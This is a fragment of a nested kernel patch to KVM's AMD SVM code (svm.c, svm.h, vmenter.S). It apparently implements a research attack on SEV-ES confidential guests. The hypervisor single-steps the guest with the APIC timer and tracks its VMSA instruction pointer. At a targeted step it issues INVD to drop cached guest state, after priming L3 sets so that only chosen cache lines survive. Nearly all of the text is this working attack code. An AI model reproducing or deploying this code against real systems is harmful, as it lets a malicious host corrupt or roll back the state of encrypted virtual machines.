++		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);
+ 	else
+ 		__svm_vcpu_run(svm, spec_ctrl_intercepted);
++	
++	/* After the context switch 
++	 * Drop is only for timer interrupt but not NPF
++	 */
++
++	exit_code = svm->vmcb->control.exit_code;
++	if (vmsa_vaddr && (exit_code == SVM_EXIT_INTR)) {
++		/* That's vec_seq thing*/
++		if (allow_invd) {
++			asm volatile ("cli\n");
++			/* Now VMSA is WB, accesses flush the CL */
++			*(volatile u64 *)(vmsa_vaddr+0x178);
++
++			/* Non-zero-step */
++			if (last_vmsa_rip != *(volatile u64 *)(vmsa_vaddr+0x178)) {
++
++				/* Potential bugs here: cur_invd_idx could be dropped */
++				cur_invd_idx++;
++				if (invd) {
++					if (cur_invd_idx == invd_idx) {
++						asm volatile ("mfence\n");
++						asm volatile ("invd\n");
++						// asm volatile(
++						// "nop\n"
++						// "mov $10000000, %%rcx\n"
++						// "1:\n"
++						// "loop 1b\n"
++						// : : : "rcx","memory");
++						asm volatile ("mfence\n");
++						printk("INTR DROP TARGET!!!\n");
++						*((volatile u64 *)(sev_step_page_va)) = 0;
++						asm volatile ("wbnoinvd\n");
++					}
++				}
++				else {
++					/* Resume */
++					mtrr_uc_page(vmsa_paddr, 3);
++					asm volatile(
++						"wbnoinvd\n"
++						"mov $10000000, %%rcx\n"
++						"1:\n"
++						"loop 1b\n"
++						: : : "rcx","memory");
++				}
++
++				/* Postpone it in case they are dropped by invd */
++				allow_invd = false;
++				apic_interval = 0;
++			}
++			asm volatile ("sti\n");
++			// printk("INTR PATTERN MATCH!!!\n");
++		}
++		/* Selectively drop a set */
++		else if (!vec_seq && invd) {
++			asm volatile ("cli\n");
++
++			/* Touch the VMSA page once so that its data get written back to memory (idk why) */
++			for (int i = 0; i < 64; i++)
++				*(volatile u64 *)(vmsa_vaddr+0x40*i);
++			asm volatile("mfence\n");
++
++			if (filter_set_idx < 0x400) {
++				// Full L3-eviction except for 16 sets that have same L2 index with the target
++				for (int i = 0; i < 0x4000; i++) {
++					if ( (i&0x3ff) != filter_set_idx) {
++						for (int j = 0; j < 20; j++)
++							prime_l3_set(evict_buffer[j]+(i<<6));
++					}
++				}
++			}
++			else {
++				for (int i = 0; i < 0x4000; i++) {
++					// filter_set_idx  0xAAABBB --- AAA ~ BBB 
++					if ( (i&0x3ff) <= ((filter_set_idx>>12)&0xfff) || (i&0x3ff) >= (filter_set_idx&0xfff)) {
++						for (int j = 0; j < 20; j++)
++							prime_l3_set(evict_buffer[j]+(i<<6));
++					}
++				}
++			}
++
++			asm volatile ("mfence\n");
++			asm volatile ("invd\n");
++			asm volatile ("mfence\n");
++			// asm volatile(
++			// "nop\n"
++			// "mov $1000000, %%rcx\n"
++			// "1:\n"
++			// "loop 1b\n"
++			// : : : "rcx","memory");
++			// printk("INTR DROP TARGET!!!\n");
++			*((volatile u64 *)(sev_step_page_va)) = 0;
++			asm volatile ("wbnoinvd\n");
++			asm volatile ("sti\n");
++		}
++	}
+ 
+ 	guest_state_exit_irqoff();
++
+ }
+ 
+diff --git a/arch/x86/kvm/svm/svm.h b/arch/x86/kvm/svm/svm.h
+index 199a2ecef1ce..4086760f6b06 100644
+--- a/arch/x86/kvm/svm/svm.h
++++ b/arch/x86/kvm/svm/svm.h
+@@ -538,6 +538,15 @@ static inline bool is_x2apic_msrpm_offset(u32 offset)
+ 
+ extern bool dump_invalid_vmcb;
+ 
++void flush(void *p);
++void maccess(void *p);
++// void prime_l2_set(void* addr);
++u64 rdpru_m(void);
++u64 rdpru_a(void);
++u64 my_read_msr(u64 msr);
++void mtrr_uc_page(u64 base, u8 num);
++void mtrr_wb_page(u64 base, u8 num);
++
+ u32 svm_msrpm_offset(u32 msr);
+ u32 *svm_vcpu_alloc_msrpm(void);
+ void svm_vcpu_init_msrpm(struct kvm_vcpu *vcpu, u32 *msrpm);
+@@ -673,6 +682,7 @@ void sev_hardware_unsetup(void);
+ int sev_cpu_init(struct svm_cpu_data *sd);
+ void sev_init_vmcb(struct vcpu_svm *svm);
+ void sev_free_vcpu(struct kvm_vcpu *vcpu);
++int __sev_dbg_decrypt(struct kvm *kvm, unsigned long src_paddr, unsigned long dst_paddr, int sz, int *err);
+ int sev_handle_vmgexit(struct kvm_vcpu *vcpu);
+ int sev_es_string_io(struct vcpu_svm *svm, int size, unsigned int port, int in);
+ void sev_es_vcpu_reset(struct vcpu_svm *svm);
+@@ -682,7 +692,8 @@ void sev_es_unmap_ghcb(struct vcpu_svm *svm);
+ 
+ /* vmenter.S */
+ 
+-void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
++u64 __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted, u32* apic_reg_addr, u32 apic_interval, u32 wbnoinvd);
++// void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
+ void __svm_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
+ 
+ #endif
+diff --git a/arch/x86/kvm/svm/vmenter.S b/arch/x86/kvm/svm/vmenter.S
+index 34367dc203f2..f17b3e459e7b 100644
+--- a/arch/x86/kvm/svm/vmenter.S
++++ b/arch/x86/kvm/svm/vmenter.S
+@@ -336,6 +336,23 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
+ 	/* Enter guest mode */
+ 	sti
+ 
++	/* Do not use APIC */
++	cmp $0, %_ASM_ARG4L
++	je 1f
++
++	/* Clean the cache state */
++	cmp $0, %_ASM_ARG5L
++	jne 3f
++
++	/* Write back the dirty cache lines (avoid crash) */
++	wbnoinvd
++	jmp 4f
++
++3:	wbinvd
++
++	/* APIC Interval */
++4:	movl %_ASM_ARG4L, (%_ASM_ARG3)
++
+ 1:	vmrun %_ASM_AX
+ 
+ 2:	cli
+@@ -387,3 +404,4 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
+ 	_ASM_EXTABLE(1b, 3b)
+ 
+ SYM_FUNC_END(__svm_sev_es_vcpu_run)
++
